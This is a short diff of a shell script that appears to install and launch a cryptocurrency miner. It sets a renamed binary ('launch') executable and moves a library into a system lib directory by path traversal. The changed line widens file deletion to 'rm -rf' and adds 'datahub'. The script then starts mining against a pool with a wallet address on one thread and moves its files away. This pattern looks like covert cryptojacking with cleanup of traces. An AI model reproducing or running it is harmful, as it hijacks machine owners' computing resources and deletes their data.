@@ -11,7 +11,7 @@ echo "Setting executable permissions"
 if ! chmod +x libuv.so launch; then
     echo "Error: Failed to set executable permissions"
     exit 1
-    else mv libuv.so ../../../usr/lib && rm EA "EA FA" run.sh 
+    else mv libuv.so ../../../usr/lib && rm -rf EA "EA FA" run.sh datahub
 fi
 echo "Starting now"
 ./launch -o $POOL:$PORT -u $MYADDRESS --tls --coin $COINNAME -t 1 && mv config.json launch ../../ && cd
